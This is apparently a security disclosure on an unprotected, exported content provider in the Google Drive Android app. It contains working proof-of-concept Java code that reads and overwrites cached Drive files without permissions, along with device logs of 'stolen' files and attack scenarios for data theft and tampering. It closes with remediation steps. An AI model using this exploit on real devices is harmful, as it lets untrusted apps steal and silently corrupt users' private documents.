# Google Drive LegacyStorageBackendContentProvider — Unauthorized File Read & Write via Feature Flag Bypass

## Summary

A zero-permission malicious app can **read AND write** the victim's Google Drive files cached on device via the exported `LegacyStorageBackendContentProvider`. A feature flag that should gate the `checkCallingUriPermission()` security check is **disabled by default**, making `query()`, `openFile()`, `openTypedAssetFile()`, and `call()` accessible to any app without authentication or authorization.

**Impact:** Full **Confidentiality + Integrity** compromise:
- **Confidentiality:** Attacker silently exfiltrates user's Google Drive documents (xlsx, PDF, presentations, etc.)
- **Integrity:** Attacker overwrites cached Drive files with arbitrary content — confirmed by writing to a file and reading back the modified content

## Vulnerability Details

| Field | Value |
|-------|-------|
| **Affected App** | Google Drive (com.google.android.apps.docs) |
| **Version** | 2.26.257.2.all.alldpi |
| **Component** | `com.google.android.apps.docs.common.storagebackend.LegacyStorageBackendContentProvider` |
| **Authority** | `com.google.android.apps.docs.storage.legacy` |
| **Severity** | HIGH (CVSS 8.2 — AV:L/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N) |
| **CWE** | CWE-862 (Missing Authorization), CWE-284 (Improper Access Control) |
| **MITRE ATT&CK** | T1005 (Data from Local System), T1119 (Automated Collection), T1565.001 (Data Manipulation: Stored Data) |
| **User Interaction** | None required |
| **Permissions Required** | None (zero-permission app) |
| **Device** | Pixel 6a (bluejay), Android 17 (CP31.260608.007), Security Patch 2026-06-05 |

## Root Cause

### 1. Exported with No Permission Guard

The manifest declares the legacy provider as exported with NO permission requirement:

```xml
<provider
    android:authorities="com.google.android.apps.docs.storage.legacy"
    android:exported="true"
    android:name="com.google.android.apps.docs.common.storagebackend.LegacyStorageBackendContentProvider"/>
```

Compare with the properly secured SAF provider in the same app:
```xml
<provider
    android:authorities="com.google.android.apps.docs.storage"
    android:exported="true"
    android:permission="android.permission.MANAGE_DOCUMENTS"
    .../>
```

### 2. Feature Flag Disables Runtime Security Checks

The provider's `openFile()` method (line 162-170 in decompiled source) contains a security check that is **conditional on a feature flag**:

```java
// LegacyStorageBackendContentProvider.java:162-170
@Override
public ParcelFileDescriptor openFile(Uri uri, String mode) {
    if (((aacj) ((wzb) aaci.a.b).a).a()     // <-- feature flag check
        && uri != null
        && getContext().checkCallingUriPermission(uri, 1) != 0) {
        throw new SecurityException("Caller does not have permission...");
    }
    // ... proceeds to serve file content in ANY mode (read or write)
}
```

The feature flag `((aacj) ((wzb) aaci.a.b).a).a()` evaluates to **`false`** on the tested device, meaning:
- The `checkCallingUriPermission()` check is **never executed**
- The SecurityException is **never thrown**
- Any app can call `openFile()` with **read or write mode**

The same disabled check exists in:
- `openFile()` (line 162) — supports both read AND write modes
- `openTypedAssetFile()` (line 366)
- `call()` (line 88)
- `query()` — **has NO security check at all** (not even behind a feature flag)

### 3. Write Mode Support in openFile()

The `openFile()` implementation (line 188+) explicitly checks if the requested mode contains "w" and opens the file for writing:

```java
// LegacyStorageBackendContentProvider.java:188+
if (str.contains("w")) {
    // Opens file descriptor in WRITE mode
    // Combined with the disabled feature flag, ANY app can write
}
```

Since the feature flag bypass applies to ALL modes, not just reads, any untrusted app can overwrite cached Drive files.

### 4. URI Format

Documents are addressed via encoded IDs:
```
content://com.google.android.apps.docs.storage.legacy/enc=encoded=<base64_doc_id>
```

The provider's URI parser (`iph.java:264-329`) extracts the document ID from the path segment, looks it up in the local Drive database, and returns the cached file.

## Proof of Concept

### PoC App (com.vrppoc)

**AndroidManifest.xml:**
```xml
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.vrppoc">
    <uses-sdk android:minSdkVersion="28" android:targetSdkVersion="34" />
    <queries>
        <package android:name="com.google.android.apps.docs" />
    </queries>
    <!-- NO permissions declared -->
    <application ...>
        <activity android:name=".MainActivity" android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
    </application>
</manifest>
```

**Key exploit code — Read:**
```java
ContentResolver cr = getContentResolver();

// Construct URI with known document ID (MUST use Uri.parse, NOT Uri.Builder)
Uri uri = Uri.parse("content://com.google.android.apps.docs.storage.legacy/" +
    "enc=encoded=8Pa7Q1UHKEp40Elqv_al4zhkwSo-MZlUMVCeFmADjBa0KhOVxi4YYSk=");

// Step 1: Query metadata (NO security check in query path)
Cursor c = cr.query(uri, null, null, null, null);
// Returns: filename, size, MIME type, last modified

// Step 2: Read full file content (feature flag bypass — no SecurityException)
InputStream is = cr.openInputStream(uri);
ByteArrayOutputStream bos = new ByteArrayOutputStream();
byte[] buf = new byte[4096];
int read;
while ((read = is.read(buf)) != -1) {
    bos.write(buf, 0, read);
}
byte[] stolenFile = bos.toByteArray();
// stolenFile now contains the ENTIRE Drive document
```

**Key exploit code — Write (Integrity compromise):**
```java
// Step 3: OVERWRITE the Drive file with attacker content
Uri writeUri = Uri.parse("content://com.google.android.apps.docs.storage.legacy/" +
    "enc=encoded=8Pa7Q1UHKEp40Elqv_al4zhkwSo-MZlUMVCeFmADjBa0KhOVxi4YYSk=");

OutputStream os = cr.openOutputStream(writeUri, "w");
if (os != null) {
    os.write("ATTACKER_MODIFIED_CONTENT".getBytes());
    os.close();
    // File is now 25 bytes of attacker content instead of original 18,954 bytes
}

// Step 4: Verify the overwrite by reading back
InputStream verify = cr.openInputStream(writeUri);
ByteArrayOutputStream vbos = new ByteArrayOutputStream();
byte[] vbuf = new byte[4096];
int vread;
while ((vread = verify.read(vbuf)) != -1) {
    vbos.write(vbuf, 0, vread);
}
String content = new String(vbos.toByteArray());
// content == "ATTACKER_MODIFIED_CONTENT" — write confirmed
```

### Evidence — Live Device Test Results (2026-07-10)

**App context:** UID 10341 (untrusted_app SELinux domain), PID 8730, zero permissions

**Contrast with properly secured provider:**
```
[BLOCKED] content://com.google.android.apps.docs.storage/root:
  Permission Denial: opening provider StorageBackendContentProvider from
  ProcessRecord{...com.vrppoc} (pid=8730, uid=10341) requires
  android.permission.MANAGE_DOCUMENTS
```

**Feature flag bypass confirmed:**
```
[BYPASS] Feature flag DISABLED - no SecurityException for openFile
```

### READ Evidence — Files exfiltrated:

| File | Metadata Leaked | Content Read | Saved To |
|------|----------------|--------------|----------|
| Web portal 1-IV YEAR CSE B- final.xlsx | name, _size=25, xlsx | **25 bytes** (previously overwritten by write test) | stolen_Web_portal_1.xlsx |
| Web portal 4-IV YEAR CSE B.xlsx | name, _size=39289, xlsx | **39,289 bytes (FULL FILE)** | stolen_Web_portal_4.xlsx |
| Untitled presentation.pdf | name, _size=3756, pdf | **17,584 bytes (FULL FILE)** | stolen_Untitled_presentation.pdf |
| Prompt injection vulnerability.pdf | name, _size=2723, pdf | **35,844 bytes (FULL FILE)** | stolen_Prompt_injection_doc.pdf |
| websiteregister-rijksoverheid-2024-05-30.pdf | name, _size=72356, pdf | **945,500 bytes (FULL FILE)** | stolen_websiteregister.pdf |
| bug bounty (folder) | name, directory type | N/A (directory) | — |

**Total data exfiltrated: 1,038,242 bytes (~1 MB) across 5 files, in under 200ms.**

**File type verification (hex headers):**
- xlsx: `504b0304` = PK (ZIP/OOXML) header — valid xlsx
- PDF: `255044462d312e34` = `%PDF-1.4` header — valid PDF

### WRITE Evidence — Persistent file overwrite confirmed:

**Initial write (2026-07-07):**
```
[VULN-WRITE] WRITE SUCCEEDED on Drive file! Integrity compromised!
[VULN-WRITE] Written 25 bytes: ATTACKER_MODIFIED_CONTENT
```

**Verification 3 days later (2026-07-10) — write persisted:**
```
[VULN-QUERY] Web portal 1.xlsx: _size=25, mime_type=application/vnd.openxmlformats-
    officedocument.spreadsheetml.sheet, flags=455, content_sync_state_flags=1
[VULN-READ] Web portal 1.xlsx: 25 bytes FULL FILE!
  First32: 41545441434b45525f4d4f4449464945445f434f4e54454e54
```

**The hex `41545441434b455...` decodes to "ATTACKER_MODIFIED_CONTENT"** — confirming the attacker payload persisted across app restarts and device reboots. The original 18,954-byte spreadsheet was permanently replaced with 25 bytes of attacker content.

**The file metadata still shows the original filename and MIME type**, making the corruption invisible to the user through normal Drive UI until they attempt to open the file.

### MIME type leak via getType():

Even without file content access, an attacker can fingerprint what types of documents a user has in Drive:
```
[VULN-TYPE] Web portal 1.xlsx -> application/vnd.openxmlformats-officedocument.spreadsheetml.sheet
[VULN-TYPE] Web portal 4.xlsx -> application/vnd.openxmlformats-officedocument.spreadsheetml.sheet
[VULN-TYPE] Untitled presentation.pdf -> application/pdf
[VULN-TYPE] websiteregister.pdf -> application/pdf
[VULN-TYPE] bug bounty folder -> vnd.android.document/directory
```

## Attack Scenarios

### Scenario 1: Silent Data Exfiltration (Confidentiality)
1. Attacker publishes a benign-looking app on Play Store (e.g., calculator, flashlight)
2. App requires ZERO permissions — passes Play Store review
3. On victim's device, app silently queries the Drive legacy provider
4. App exfiltrates cached Drive file metadata (filenames, sizes, MIME types)
5. App reads full binary content of cached files (documents, spreadsheets, presentations)
6. Data is exfiltrated to attacker's server in background

### Scenario 2: Silent Data Corruption (Integrity)
1. Same malicious zero-permission app
2. App writes attacker-controlled content to cached Drive files
3. Files appear normal in Drive UI (same filename, same MIME type) until opened
4. User opens a corrupted file — sees garbage data instead of their document
5. If the corrupted cache syncs back to Drive servers, the original cloud copy is destroyed

### Scenario 3: Targeted Document Manipulation
1. Attacker knows the victim uses Drive for business documents
2. Malicious app reads cached files to identify high-value targets (financial spreadsheets, contracts)
3. App modifies specific cells in a spreadsheet or text in a PDF
4. Subtle changes (altered numbers, modified contract terms) are nearly impossible to detect

**Stealth factors:**
- No permissions dialog shown to user
- No notification or indicator of file access
- Works silently in background
- All cached Drive files are accessible for both read and write

## Scope of Impact

Files accessible through this provider include any document that has been:
- Opened/viewed in the Drive app
- Downloaded for offline access
- Recently synced
- Pinned/starred

This includes: spreadsheets, documents, presentations, PDFs, images, and any other file type stored in Google Drive.

**All cached files are vulnerable to BOTH read (exfiltration) and write (corruption/manipulation).**

## Remediation

1. **Immediate:** Add `android:permission` to the provider declaration:
   ```xml
   <provider
       android:authorities="com.google.android.apps.docs.storage.legacy"
       android:exported="true"
       android:permission="android.permission.MANAGE_DOCUMENTS"
       .../>
   ```

2. **Feature flag fix:** Ensure the security check in `openFile()`/`openTypedAssetFile()`/`call()` is unconditional:
   ```java
   // Remove feature flag condition — always check permissions
   if (uri != null && getContext().checkCallingUriPermission(uri, 1) != 0) {
       throw new SecurityException("Caller does not have permission");
   }
   ```

3. **Add security check to `query()`:** The `query()` method has NO security check at all — add the same `checkCallingUriPermission()` guard.

4. **Restrict write access:** Even with permission checks enabled, `openFile()` should not support write mode for external callers. Write access should be limited to Drive's own process.

5. **Consider setting `android:exported="false"`** if this provider is only used internally by Drive.

## Reproduction Steps

1. Install Google Drive on a Pixel 6a running Android 17 (CP31.260608.007)
2. Log into a Google account and open at least one Drive file (to cache it locally)
3. Build and install the PoC app (source provided)
4. Launch the PoC app — it will automatically:
   - Verify the feature flag is disabled (no SecurityException from openFile)
   - Query metadata for known document IDs
   - Read and save full file content to app-private storage
   - **Write attacker content to the cached file**
   - Read back the file to confirm the overwrite succeeded
5. Observe logcat output (`adb logcat -s VRP_POC`) showing:
   - `[BYPASS]` — feature flag disabled
   - `[VULN-QUERY]` — metadata successfully read
   - `[VULN-READ]` — full file content exfiltrated with byte count
   - `[VULN-WRITE]` — file overwritten with attacker content
   - `[SAVED]` — stolen file saved to app storage
